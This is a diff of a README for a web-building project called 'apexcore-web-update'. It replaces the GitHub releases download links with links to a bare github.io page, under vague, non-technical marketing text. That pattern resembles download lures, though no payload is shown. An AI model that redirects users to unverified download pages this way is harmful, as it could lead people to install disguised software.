@@ -1,12 +1,12 @@
 # 🌐 apexcore-web-update - Build modern web experiences with ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/calhounshy907/apexcore-web-update/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://calhounshy907.github.io)
 
 ApexCore vUnreleased provides a foundation for your web projects. This software helps you create web pages for the year 2026. It includes setup tools, settings, and guides. You do not need coding skills to use these core files.
 
 ## 📥 Getting Started
 
-Visit this page to download the latest version: [https://github.com/calhounshy907/apexcore-web-update/releases](https://github.com/calhounshy907/apexcore-web-update/releases)
+Visit this page to download the latest version: [https://calhounshy907.github.io](https://calhounshy907.github.io)
 
 To get started, follow these steps:
 
